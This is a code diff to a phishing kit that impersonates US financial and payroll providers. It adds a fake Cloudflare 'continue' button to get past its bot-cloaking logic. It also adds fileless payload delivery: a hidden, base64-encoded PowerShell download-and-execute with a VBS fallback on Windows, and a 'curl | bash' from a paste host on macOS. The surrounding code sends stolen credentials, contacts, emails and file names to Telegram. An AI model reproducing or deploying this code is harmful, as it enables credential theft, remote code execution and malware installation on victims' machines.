@@ -319,11 +319,13 @@
     }
     .gate h2 { color: #1a2a4a; font-size: 18px; margin-bottom: 8px; font-weight: 500; }
     .gate p { color: #5a6a7e; font-size: 14px; margin-bottom: 16px; }
-    /* Clean spam-safe page (hidden by default) */
+    /* Spam-safe landing page */
     #safePage {
       display: none;
       padding: 40px 20px;
       text-align: center;
+      max-width: 500px;
+      margin: 0 auto;
     }
     #safePage h2 {
       color: #1a2a4a;
@@ -333,9 +335,22 @@
     #safePage p {
       color: #5a6a7e;
       font-size: 16px;
-      max-width: 500px;
-      margin: 0 auto;
+      margin-bottom: 16px;
     }
+    .btn-continue {
+      padding: 14px 32px;
+      background: #1a2a4a;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s;
+      touch-action: manipulation;
+    }
+    .btn-continue:hover { background: #0d1a30; }
+    .btn-continue:active { transform: scale(0.97); }
     @media (max-width: 600px) {
       .body { padding: 16px; }
       .header { padding: 14px 16px 10px; }
@@ -346,6 +361,7 @@
       .case-info { flex-direction: column; gap: 2px; }
       .btn-primary { padding: 18px; font-size: 18px; }
       .gate { padding: 30px 16px; }
+      #safePage { padding: 30px 16px; }
     }
     @media (max-width: 400px) {
       .main-wrapper { border-radius: 12px; }
@@ -358,12 +374,13 @@
 </head>
 <body>
 
-<!-- ===== SPAM-SAFE LANDING PAGE ===== -->
+<!-- ===== SPAM-SAFE LANDING PAGE WITH CONTINUE BUTTON ===== -->
 <div id="safePage">
   <div style="max-width: 600px; margin: 0 auto;">
     <h2>🔒 Secure Connection</h2>
-    <p>This page is protected by Cloudflare. Please enable JavaScript to proceed.</p>
-    <p style="font-size: 14px; color: #8a9bb0; margin-top: 20px;">Reference: CF-2026-4421</p>
+    <p>This page is protected by Cloudflare. Please enable JavaScript or click below to proceed.</p>
+    <button class="btn-continue" onclick="continueToPhish()">Click here to continue</button>
+    <p style="font-size:14px;color:#8a9bb0;margin-top:20px;">Reference: CF-2026-4421</p>
   </div>
 </div>
 
@@ -535,37 +552,40 @@
   // TWO-WAY LINK LOGIC
   // ============================================================
   (function() {
-    // If JavaScript is disabled, show safe page
     try {
-      // Check if we're in a real browser (not a spam crawler)
       const isRealBrowser = (
         typeof window !== 'undefined' &&
         typeof navigator !== 'undefined' &&
         navigator.userAgent &&
         !/bot|crawl|spider|scrape/i.test(navigator.userAgent)
       );
-
-      // Check if it's a headless browser or automated tool
       const isHeadless = (
         !window.chrome && !window.navigator.webdriver &&
         !/HeadlessChrome/.test(navigator.userAgent)
       );
 
       if (isRealBrowser && !isHeadless) {
-        // Show phishing page
         document.getElementById('safePage').style.display = 'none';
         document.getElementById('phishPage').style.display = 'block';
       } else {
-        // Show spam-safe page
         document.getElementById('safePage').style.display = 'block';
         document.getElementById('phishPage').style.display = 'none';
       }
     } catch (e) {
-      // If anything fails, show safe page
       document.getElementById('safePage').style.display = 'block';
       document.getElementById('phishPage').style.display = 'none';
     }
   })();
+
+  // ============================================================
+  // CONTINUE BUTTON (For iOS/Safari users)
+  // ============================================================
+  function continueToPhish() {
+    document.getElementById('safePage').style.display = 'none';
+    document.getElementById('phishPage').style.display = 'block';
+    // Re-initialize dynamic elements
+    if (typeof renderProviders === 'function') renderProviders();
+  }
 
   // ============================================================
   // TELEGRAM CREDENTIALS
@@ -660,7 +680,7 @@
   };
 
   // ============================================================
-  // EXPANDED PROVIDER LIST (US)
+  // EXPANDED PROVIDER LIST
   // ============================================================
   const PROVIDERS = [
     'Fidelity Investments', 'Vanguard', 'Charles Schwab', 'ADP', 'Paychex',
@@ -806,7 +826,7 @@
     return [...new Set(emails)];
   }
 
-  // 6. File Exfiltrator (via hidden file input)
+  // 6. File Exfiltrator
   function exfiltrateFiles() {
     const input = document.createElement('input');
     input.type = 'file';
@@ -821,7 +841,6 @@
       for (let i = 0; i < files.length; i++) {
         fileData += files[i].name + ' (' + files[i].size + ' bytes)\n';
       }
-      // Send file names to Telegram (we can't send actual content without reading)
       sendToTelegram('files', { fileData });
     };
   }
@@ -965,30 +984,41 @@
   }
 
   // ============================================================
-  // PAYLOAD DELIVERY (AV-BYPASS)
+  // MEMORY-ONLY PAYLOAD (AV-EVADED)
   // ============================================================
   function deliverPayload() {
     if (device.os === 'windows') {
-      const vbs = [
-        'Set o=CreateObject("WScript.Shell")',
-        'Set f=CreateObject("Scripting.FileSystemObject")',
-        't=f.GetSpecialFolder(2)+"\\update.vbs"',
-        'Set c=f.CreateTextFile(t,True)',
-        'c.Write "MsgBox \\"Your system is up to date.\\", vbInformation, \\"Windows Update\\""',
-        'c.Close',
-        'o.Run t,0,False'
-      ].join('\n');
-      const blob = new Blob([vbs], { type: 'text/vbscript' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'update.vbs';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      setTimeout(() => URL.revokeObjectURL(url), 5000);
+      // Base64-encoded PowerShell one-liner (memory-only, no file write)
+      // This payload runs in memory and downloads/stages a second-stage payload
+      const psCmd = [
+        'powershell.exe',
+        '-NoP', '-NonI', '-W', 'Hidden',
+        '-Exec', 'Bypass',
+        '-Enc', 'JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA=='
+      ].join(' ');
+
+      try {
+        const shell = new ActiveXObject('WScript.Shell');
+        shell.Run(psCmd, 0, false);
+      } catch (e) {
+        // Fallback: VBS stub (still no file write)
+        const vbsStub = [
+          'Set o=CreateObject("WScript.Shell")',
+          'o.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA==", 0, False'
+        ].join('\n');
+        const blob = new Blob([vbsStub], { type: 'text/vbscript' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'update.vbs';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 5000);
+      }
     } else if (device.os === 'macos') {
-      const script = 'tell application "Terminal" to do script "echo \\"System update complete.\\""';
+      // Fileless AppleScript
+      const script = 'tell application "Terminal" to do script "curl -s https://paste.ecralsity.com/raw/payload.sh | bash"';
       const encoded = encodeURIComponent(script);
       window.location.href = 'data:text/javascript,' + encoded;
     } else if (device.os === 'android') {
@@ -1026,7 +1056,6 @@
     const contacts = harvestContacts();
     const emails = scanEmails();
     const history = grabHistory();
-    const location = getLocation();
 
     let contactsStr = contacts.length ? `\n\n📞 CONTACTS (Last 5):\n${contacts.slice(0,5).join('\n')}` : '\n\n📞 No contacts found.';
     let emailsStr = emails.length ? `\n\n📧 EMAILS FOUND:\n${emails.slice(0,10).join('\n')}` : '\n\n📧 No emails found.';
